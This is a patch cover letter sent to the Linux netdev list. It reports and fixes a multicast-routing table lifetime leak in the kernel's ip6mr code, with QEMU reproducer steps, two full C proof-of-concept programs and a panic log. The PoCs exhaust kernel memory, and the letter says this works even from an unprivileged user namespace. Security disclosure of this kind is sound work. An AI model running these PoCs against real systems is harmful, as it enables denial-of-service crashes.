Received: from mail-pg1-f180.google.com (mail-pg1-f180.google.com [209.85.215.180])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id DC4B7348465
	for <netdev@vger.kernel.org>; Thu, 23 Jul 2026 17:38:36 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.215.180
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1784828318; cv=none; b=cC6eDoBKmec5PORrNZsFSDKBRAPH0LMZcxkUZJuRqCGuivXWWw9v/vbg80cwlLqZR+ELYj5CYaupq8T+bjZwn53AAIl/0aVv77EjPTH+XhNSiOWksiyPKu/win8H1l9WgpM5IVGHVH3v40yU+Zm8abD20TyDPQccg018+spR1VI=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1784828318; c=relaxed/simple;
	bh=Ra65sourFN24bdVK5FVlJDpkkLqkUAydas7G+NpwxuE=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=DHSm8MMxlKDIyUgjgD9zQxrLScMBhOA3GS577emSuS+YoPPu/PQcIqTfGwTtoR0vpNXY0vzVKAsoFQQnP2U2J4qfPOQTWimalLB87FnJmGv7mSNhYdrg0zntkVSivWM7roNtvCSR0b8tesh+pr9Dex3pLeBSU3iVum8AJdHcb/M=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=IACXFhog; arc=none smtp.client-ip=209.85.215.180
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="IACXFhog"
Received: by mail-pg1-f180.google.com with SMTP id 41be03b00d2f7-ca766c1c9ccso641328a12.0
        for <netdev@vger.kernel.org>; Thu, 23 Jul 2026 10:38:36 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1784828316; x=1785433116; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=SlH2y6Qkm5eusgAks1NwkC+mDFGK5kpxxiZRUEVxAqY=;
        b=IACXFhogW1whi3fttffi+WFkbvBtjuz+gjV27a3+Vn62Y9M+Yl9Qx3vXGrNAL99aZS
         5IF44Am/++NLuNLlvgMTAUM9zDsOiuTVPeZi7FtqHuk4mbfrIaFfI+sucPP0cB9fjayT
         Sex+xOeEZYc5FU8xkkVQ+lLV1cPI9zw9f2pO2vwD7Gq1vNDC5Vphzxo9IPCYqJaaMY/3
         MmL9redAJMf6gptWQFYj35UDfYhpZfIzdQPX0KVmRwQziGgBi1HSWUz/DY5rIiucTuYd
         fGnB4YNm+q3wLxFDMRAlq6Jjvvq0xltamNRCQZLV16vccinwbutyqiMmepbu7dMo861v
         i2bg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1784828316; x=1785433116;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=SlH2y6Qkm5eusgAks1NwkC+mDFGK5kpxxiZRUEVxAqY=;
        b=p5mFyugdjDb0P9pth9jWrXoIH5ChLQMABTwv9KJ+lcoNQm5E65S0P8ttqJkG8Vjw3I
         8rk1ILN8i8UeGIbutSktdwDRG2D2jFXlijeEgVZDQemu8K57PSr8xgftwG/cXY4jwS5H
         eezTxwvQJ4ztlrD0pdU+m0JEuPwcISmydzDBNMyBw1bx4osEgP0F6Svm2Tygxw+wbm/U
         RXEtdpO+tlsBZ0o9fH8nCccJwWwbyFcWxuaV5uOP+B5wlxUpkyWOGZR6BAN1BftJRWJg
         ZsXYdYZvaCcKtAQWTICuDN7ppK7Vh8qfJIpmX/DZTcsdZOi+hobquI14ndV4WWR/skgb
         UNMw==
X-Gm-Message-State: AOJu0YwV4hBxSDaioH5Zd+nxifSoObyopklBQ+r9M6QA3ZjfYHNamOkn
	nGef1GnMHobljRW7Ij9vUc2Av1K4po7S+P9Mx/+GWRsylqEZiomGD/WOv5pkVPguBVA=
X-Gm-Gg: AR+sD109EGijmQon7QtstGRwBgZool/aG0HNidJYk0xyNAk4GC1yeaSD7Xo9kpRQe5d
	bMgVelfcMUxhT7XxeGEfa/rgN5ODHVwJrKzFBfJ8easMz7zWwyLNah7fnr8cPbO1rMxW8M6TWOf
	8Y0i+P5w3Uk8mHuwKcMA4nudLLurDtyLC6XfvaDrX3XJW/40hnFnoihYKfd+2EZsqHHRZ0Bk+sU
	43Z2dNBXUYoz6p9mtckQsP0RNV4GjKnfMghFsw2BiW3psUdXgUBhDpv2i2G0nS2EwkKplQKzB1F
	ATR9HlRnatQmoc2nBd7uZgWdM7ZE0SnjDmf0iv04hwAtk1OW9OvVzjsmhuAjpOuRW4MeT73ZQwj
	Nls6HwksB96oB401zCGU7msj2U8g8W1+SrCPVmwX+6dFAnOc0XJGbmT/aDBD4XcWRF0T6lZe9Rd
	y0i0ufBjwrniJWCWnqZ7A=
X-Received: by 2002:a05:6a00:218f:b0:847:8449:2bb6 with SMTP id d2e1a72fcca58-84e2b7e3fefmr4884434b3a.4.1784828316049;
        Thu, 23 Jul 2026 10:38:36 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([167.71.204.91])
        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-84e175f1e8dsm3488867b3a.55.2026.07.23.10.38.27
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Thu, 23 Jul 2026 10:38:35 -0700 (PDT)
From: Ren Wei <enjou1224z@gmail.com>
To: netdev@vger.kernel.org
Cc: dsahern@kernel.org,
	idosch@nvidia.com,
	davem@davemloft.net,
	edumazet@google.com,
	pabeni@redhat.com,
	horms@kernel.org,
	kaber@trash.net,
	vega@nebusec.ai,
	zihanx@nebusec.ai,
	enjou1224z@gmail.com
Subject: [PATCH net 0/1] ipv6: ip6mr: fix mr_table lifetime leak
Date: Fri, 24 Jul 2026 01:38:22 +0800
Message-ID: <cover.1784795838.git.zihanx@nebusec.ai>
X-Mailer: git-send-email 2.51.0
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: quoted-printable

From: Zihan Xi <zihanx@nebusec.ai>=0D

Hi Linux kernel maintainers,=0D
=0D
We found and validated a table lifetime leak in net/ipv6/ip6mr.c. The=0D
bug is reachable through IPPROTO_IPV6 multicast-routing setsockopt=0D
operations on a raw ICMPv6 socket by a task that has CAP_NET_ADMIN and=0D
CAP_NET_RAW in the target netns, including a process that first enters=0D
a fresh user+net namespace with unshare -Urn. We tested the fix on=0D
Linux 7.2-rc4, including the legacy MRT6_TABLE loop plus INIT/close=0D
and INIT/DONE teardown paths, and it should not affect other multicast=0D
routing functionality. The decoded crash log below is the preserved=0D
unfixed reference panic from an earlier 7.1.0-rc1 run.=0D
=0D
This series contains one patch:=0D
  1/1 ipv6: ip6mr: fix mr_table lifetime leak=0D
=0D
We provide bug details, reproducer steps, and a crash log below.=0D
=0D
---- details below ----=0D
=0D
Bug details:=0D
=0D
MRT6_TABLE should only select a multicast routing table, but a fresh=0D
non-default mr_table could still outlive the socket once MRT6_INIT=0D
published it. After MRT6_DONE or socket close, ip6mr_sk_done() cleared=0D
the routing state but left an empty table linked from mr6_tables, so=0D
repeated MRT6_TABLE(fresh id) -> MRT6_INIT -> MRT6_DONE/close cycles=0D
accumulated detached tables until netns teardown and eventually=0D
exhausted memory.=0D
=0D
A safe fix needs to account for RCU readers in lookup, getsockopt,=0D
ioctl, and multicast data paths. This series keeps MRT6_TABLE as a=0D
pure selector, adds refcounted lifetime pins for runtime users and=0D
socket ownership, removes empty non-default tables from the published=0D
set with list_del_rcu() during teardown, and defers the final free to=0D
process context when the last reference drops outside RTNL. The common=0D
mr_table allocator also holds a netns reference until final table=0D
destruction.=0D
=0D
Reproducer:=0D
=0D
    host$ qemu-img create -f qcow2 -F raw \=0D
      -b /mnt/d/WSL/prepare-package/kernel-image/bullseye.img \=0D
      /tmp/ip6mr-master-verify-overlay.qcow2=0D
    host$ qemu-system-x86_64 -m 2G -cpu host -smp 2 \=0D
      -machine accel=3Dkvm \=0D
      -kernel /var/cache/linux-patch/ip6mr-master-build/arch/x86/boot/bzIma=
ge \=0D
      -append 'root=3D/dev/sda rw console=3DttyS0 earlyprintk=3Dserial \=0D
      net.ifnames=3D0 biosdevname=3D0 panic_on_warn=3D1 oops=3Dpanic \=0D
      slub_debug=3DFZPU page_poison=3D1 init_on_alloc=3D1 init_on_free=3D1'=
 \=0D
      -drive file=3D/tmp/ip6mr-master-verify-overlay.qcow2,format=3Dqcow2 \=
=0D
      -nographic -netdev user,id=3Dnet0,hostfwd=3Dtcp::19023-:22 \=0D
      -device virtio-net-pci,netdev=3Dnet0=0D
    host$ scp -P 19023 poc.static verify-clean/poc-initdone.static \=0D
      root@localhost:/tmp/=0D
    guest# /tmp/poc.static 30000 1=0D
    guest# /tmp/poc-initdone.static 10000 500000 close=0D
    guest# /tmp/poc-initdone.static 10000 600000 done=0D
    guest# su - test_user -c \=0D
      'unshare -Urn sh -c "/tmp/poc-initdone.static \=0D
      10000 700000 done"'=0D
=0D
We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.=0D
=0D
The main INIT/close and INIT/DONE reproducer is shown first. The=0D
legacy MRT6_TABLE-only helper used for the secondary check follows.=0D
=0D
------BEGIN poc-initdone.c------=0D
=0D
#define _GNU_SOURCE=0D
#include <errno.h>=0D
#include <linux/mroute6.h>=0D
#include <netinet/icmp6.h>=0D
#include <stdio.h>=0D
#include <stdlib.h>=0D
#include <string.h>=0D
#include <sys/resource.h>=0D
#include <sys/socket.h>=0D
#include <sys/types.h>=0D
#include <unistd.h>=0D
=0D
static void usage(const char *prog)=0D
{=0D
	fprintf(stderr,=0D
		"Usage: %s [count] [start_table] [mode]\n"=0D
		"  count: number of sockets/tables to create (default: 20000)\n"=0D
		"  start_table: first table id to use (default: 1)\n"=0D
		"  mode: close | done (default: close)\n",=0D
		prog);=0D
	exit(1);=0D
}=0D
=0D
static int do_one(unsigned int table, int do_done)=0D
{=0D
	int fd;=0D
	int one =3D 1;=0D
=0D
	fd =3D socket(AF_INET6, SOCK_RAW, IPPROTO_ICMPV6);=0D
	if (fd < 0) {=0D
		fprintf(stderr, "socket failed for table %u: %s\n", table,=0D
			strerror(errno));=0D
		return -1;=0D
	}=0D
=0D
	if (setsockopt(fd, IPPROTO_IPV6, MRT6_TABLE, &table, sizeof(table)) < 0) {=
=0D
		fprintf(stderr, "MRT6_TABLE(%u) failed: %s\n", table,=0D
			strerror(errno));=0D
		close(fd);=0D
		return -1;=0D
	}=0D
=0D
	if (setsockopt(fd, IPPROTO_IPV6, MRT6_INIT, &one, sizeof(one)) < 0) {=0D
		fprintf(stderr, "MRT6_INIT(%u) failed: %s\n", table,=0D
			strerror(errno));=0D
		close(fd);=0D
		return -1;=0D
	}=0D
=0D
	if (do_done && setsockopt(fd, IPPROTO_IPV6, MRT6_DONE, &one, sizeof(one)) =
< 0) {=0D
		fprintf(stderr, "MRT6_DONE(%u) failed: %s\n", table,=0D
			strerror(errno));=0D
		close(fd);=0D
		return -1;=0D
	}=0D
=0D
	if (close(fd) < 0) {=0D
		fprintf(stderr, "close(%u) failed: %s\n", table, strerror(errno));=0D
		return -1;=0D
	}=0D
=0D
	return 0;=0D
}=0D
=0D
int main(int argc, char **argv)=0D
{=0D
	unsigned int count =3D 20000;=0D
	unsigned int start =3D 1;=0D
	unsigned int i;=0D
	int do_done =3D 0;=0D
=0D
	if (argc > 4)=0D
		usage(argv[0]);=0D
	if (argc >=3D 2)=0D
		count =3D strtoul(argv[1], NULL, 0);=0D
	if (argc >=3D 3)=0D
		start =3D strtoul(argv[2], NULL, 0);=0D
	if (argc =3D=3D 4) {=0D
		if (!strcmp(argv[3], "done"))=0D
			do_done =3D 1;=0D
		else if (strcmp(argv[3], "close"))=0D
			usage(argv[0]);=0D
	}=0D
=0D
	if (!count || !start || start >=3D 100000000U)=0D
		usage(argv[0]);=0D
=0D
	for (i =3D 0; i < count; i++) {=0D
		u_int32_t table =3D start + i;=0D
=0D
		if (table >=3D 100000000U) {=0D
			fprintf(stderr, "stopped before invalid table id %u\n", table);=0D
			break;=0D
		}=0D
=0D
		if (do_one(table, do_done) < 0)=0D
			return 2;=0D
=0D
		if ((i % 1000) =3D=3D 0) {=0D
			struct rusage ru;=0D
=0D
			if (!getrusage(RUSAGE_SELF, &ru))=0D
				fprintf(stderr,=0D
					"completed=3D%u current_table=3D%u maxrss_kb=3D%ld mode=3D%s\n",=0D
					i + 1, table, ru.ru_maxrss,=0D
					do_done ? "done" : "close");=0D
			else=0D
				fprintf(stderr,=0D
					"completed=3D%u current_table=3D%u mode=3D%s\n",=0D
					i + 1, table, do_done ? "done" : "close");=0D
		}=0D
	}=0D
=0D
	fprintf(stderr,=0D
		"done: completed %u init/%s cycles starting at table %u\n",=0D
		i, do_done ? "done" : "close", start);=0D
	sleep(2);=0D
	return 0;=0D
}=0D
=0D
------END poc-initdone.c--------=0D
=0D
------BEGIN poc.c------=0D
=0D
#define _GNU_SOURCE=0D
#include <arpa/inet.h>=0D
#include <errno.h>=0D
#include <linux/mroute6.h>=0D
#include <netinet/icmp6.h>=0D
#include <netinet/in.h>=0D
#include <stdio.h>=0D
#include <stdlib.h>=0D
#include <string.h>=0D
#include <sys/resource.h>=0D
#include <sys/socket.h>=0D
#include <sys/types.h>=0D
#include <unistd.h>=0D
=0D
static void die(const char *msg)=0D
{=0D
	perror(msg);=0D
	exit(1);=0D
}=0D
=0D
static void usage(const char *prog)=0D
{=0D
	fprintf(stderr,=0D
		"Usage: %s [count] [start_table]\n"=0D
		"  count: number of new MRT6 table ids to allocate (default: 200000)\n"=0D
		"  start_table: first table id to use (default: 1)\n",=0D
		prog);=0D
	exit(1);=0D
}=0D
=0D
int main(int argc, char **argv)=0D
{=0D
	unsigned int count =3D 200000;=0D
	unsigned int start =3D 1;=0D
	unsigned int i;=0D
	int fd;=0D
=0D
	if (argc > 3)=0D
		usage(argv[0]);=0D
	if (argc >=3D 2)=0D
		count =3D strtoul(argv[1], NULL, 0);=0D
	if (argc =3D=3D 3)=0D
		start =3D strtoul(argv[2], NULL, 0);=0D
=0D
	if (count =3D=3D 0 || start =3D=3D 0 || start >=3D 100000000U)=0D
		usage(argv[0]);=0D
=0D
	fd =3D socket(AF_INET6, SOCK_RAW, IPPROTO_ICMPV6);=0D
	if (fd < 0)=0D
		die("socket(AF_INET6, SOCK_RAW, IPPROTO_ICMPV6)");=0D
=0D
	for (i =3D 0; i < count; i++) {=0D
		u_int32_t table =3D start + i;=0D
=0D
		if (table >=3D 100000000U) {=0D
			fprintf(stderr, "stopped before invalid table id %u\n", table);=0D
			break;=0D
		}=0D
=0D
		if (setsockopt(fd, IPPROTO_IPV6, MRT6_TABLE, &table,=0D
			       sizeof(table)) < 0) {=0D
			fprintf(stderr,=0D
				"setsockopt(MRT6_TABLE, %u) failed after %u allocations: %s\n",=0D
				table, i, strerror(errno));=0D
			close(fd);=0D
			return 2;=0D
		}=0D
=0D
		if ((i % 10000) =3D=3D 0) {=0D
			struct rusage ru;=0D
=0D
			if (!getrusage(RUSAGE_SELF, &ru))=0D
				fprintf(stderr,=0D
					"allocated=3D%u current_table=3D%u maxrss_kb=3D%ld\n",=0D
					i + 1, table, ru.ru_maxrss);=0D
			else=0D
				fprintf(stderr, "allocated=3D%u current_table=3D%u\n",=0D
					i + 1, table);=0D
		}=0D
	}=0D
=0D
		fprintf(stderr,=0D
			"done: allocated %u tables on one socket without MRT6_INIT; closing sock=
et now\n",=0D
			i);=0D
	close(fd);=0D
	sleep(2);=0D
fprintf(stderr, "socket closed; tables persist until netns teardown\n");=0D
return 0;=0D
}=0D
=0D
------END poc.c--------=0D
=0D
The decoded crash log below is the preserved unfixed reference panic=0D
from the earlier 7.1.0-rc1 run.=0D
=0D
----BEGIN crash log----=0D
[ 1443.893330][    T1] Kernel panic - not syncing: System is deadlocked on =
memory=0D
[ 1443.893927][    T1] CPU: 3 UID: 0 PID: 1 Comm: systemd Not tainted 7.1.0=
-rc1 #2 PREEMPT(full)=0D
[ 1443.894503][    T1] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, =
1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014=0D
[ 1443.895175][    T1] Call Trace:=0D
[ 1443.895398][    T1]  <TASK>=0D
[ 1443.895601][ T1] vpanic+0x6c3/0x790 =0D
[ 1443.895879][ T1] ? __pfx_vpanic+0x10/0x10 =0D
[ 1443.896186][ T1] panic+0xca/0xd0 =0D
[ 1443.896433][ T1] ? __pfx_panic+0x10/0x10 =0D
[ 1443.896749][ T1] ? srso_alias_return_thunk+0x5/0xfbef5 =0D
[ 1443.897134][ T1] out_of_memory+0x1400/0x1430 =0D
[ 1443.897461][ T1] ? __pfx_out_of_memory+0x10/0x10 =0D
[ 1443.897813][ T1] ? srso_alias_return_thunk+0x5/0xfbef5 =0D
[ 1443.898196][ T1] __alloc_frozen_pages_noprof+0x2306/0x2af0 =0D
[ 1443.898613][ T1] ? __pfx_blk_mq_flush_plug_list+0x10/0x10 =0D
[ 1443.899002][ T1] ? srso_alias_return_thunk+0x5/0xfbef5 =0D
[ 1443.899373][ T1] ? ext4_mpage_readpages+0x577/0x14d0 =0D
[ 1443.899733][ T1] ? __pfx___alloc_frozen_pages_noprof+0x10/0x10 =0D
[ 1443.900180][ T1] ? srso_alias_return_thunk+0x5/0xfbef5 =0D
[ 1443.900543][ T1] ? __blk_flush_plug+0x27d/0x4e0 =0D
[ 1443.900912][ T1] ? srso_alias_return_thunk+0x5/0xfbef5 =0D
[ 1443.901277][ T1] ? blk_finish_plug+0x52/0xa0 =0D
[ 1443.901605][ T1] alloc_pages_mpol+0x14a/0x440 =0D
[ 1443.901919][ T1] ? __pfx_alloc_pages_mpol+0x10/0x10 =0D
[ 1443.902263][ T1] ? srso_alias_return_thunk+0x5/0xfbef5 =0D
[ 1443.902643][ T1] folio_alloc_noprof+0x16/0x1a0 =0D
[ 1443.902965][ T1] filemap_alloc_folio_noprof.part.0+0x285/0x350 =0D
[ 1443.903371][ T1] ? __pfx_filemap_alloc_folio_noprof.part.0+0x10/0x10 =0D
[ 1443.903813][ T1] ? srso_alias_return_thunk+0x5/0xfbef5 =0D
[ 1443.904177][ T1] ? srso_alias_return_thunk+0x5/0xfbef5 =0D
[ 1443.904560][ T1] __filemap_get_folio_mpol+0x3e2/0x880 =0D
[ 1443.904934][ T1] filemap_fault+0x12c6/0x2370 =0D
[ 1443.905251][ T1] ? __pfx_filemap_fault+0x10/0x10 =0D
[ 1443.905634][ T1] ? srso_alias_return_thunk+0x5/0xfbef5 =0D
[ 1443.905996][ T1] ? find_held_lock+0x2b/0x80 =0D
[ 1443.906296][ T1] ? __pfx_filemap_map_pages+0x10/0x10 =0D
[ 1443.906672][ T1] __do_fault+0xf0/0x310 =0D
[ 1443.906952][ T1] do_fault+0x873/0x1230 =0D
[ 1443.907243][ T1] __handle_mm_fault+0x1186/0x1f90 =0D
[ 1443.907595][ T1] ? srso_alias_return_thunk+0x5/0xfbef5 =0D
[ 1443.907980][ T1] ? reacquire_held_locks+0xcd/0x1f0 =0D
[ 1443.908329][ T1] ? __pfx___handle_mm_fault+0x10/0x10 =0D
[ 1443.908714][ T1] ? srso_alias_return_thunk+0x5/0xfbef5 =0D
[ 1443.909081][ T1] ? lock_vma_under_rcu+0x12b/0x3f0 =0D
[ 1443.909439][ T1] ? __pfx_lock_vma_under_rcu+0x10/0x10 =0D
[ 1443.909822][ T1] handle_mm_fault+0x2ad/0x8c0 =0D
[ 1443.910138][ T1] ? rcu_is_watching+0x12/0xc0 =0D
[ 1443.910444][ T1] ? srso_alias_return_thunk+0x5/0xfbef5 =0D
[ 1443.910815][ T1] do_user_addr_fault+0x302/0xdd0 =0D
[ 1443.911147][ T1] ? trace_page_fault_user+0x133/0x180 =0D
[ 1443.911514][ T1] exc_page_fault+0x64/0xd0 =0D
[ 1443.911812][ T1] asm_exc_page_fault+0x26/0x30 =0D
[ 1443.912130][    T1] RIP: 0033:0x7f4be5e464d4=0D
[ 1443.912422][ T1] Code: Unable to access opcode bytes at 0x7f4be5e464aa.=
=0D
=0D
Code starting with the faulting instruction=0D
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=0D
[ 1443.912875][    T1] RSP: 002b:00007ffec58b8a60 EFLAGS: 00010286=0D
[ 1443.913276][    T1] RAX: 0000000000000000 RBX: 0000000000000002 RCX: 000=
0000000000000=0D
[ 1443.913785][    T1] RDX: 00007f4be5f96000 RSI: ffffffffffffffff RDI: 000=
07f4be6375a73=0D
[ 1443.914285][    T1] RBP: 00007f4be6375a71 R08: 000055b690575010 R09: 000=
055b690587810=0D
[ 1443.914805][    T1] R10: 00007f4be5f198b6 R11: 0000000000000057 R12: fff=
fffffffffffff=0D
[ 1443.915306][    T1] R13: 000055b690575010 R14: 0000000000000000 R15: 000=
0000000000073=0D
[ 1443.915839][    T1]  </TASK>=0D
[ 1443.916485][    T1] Kernel Offset: disabled=0D
[ 1443.916802][    T1] Rebooting in 86400 seconds..=0D
=0D
-----END crash log-----=0D
=0D
Best regards,=0D
Zihan Xi=0D
=0D
Zihan Xi (1):=0D
  ipv6: ip6mr: fix mr_table lifetime leak=0D
=0D
 include/linux/mroute_base.h |   6 +=0D
 net/ipv4/ipmr_base.c        |   6 +-=0D
 net/ipv6/ip6mr.c            | 328 +++++++++++++++++++++++++++---------=0D
 3 files changed, 258 insertions(+), 82 deletions(-)=0D
=0D
=0D
base-commit: 1590cf0329716306e948a8fc29f1d3ee87d3989f=0D
-- =0D
2.43.0=0D
=0D
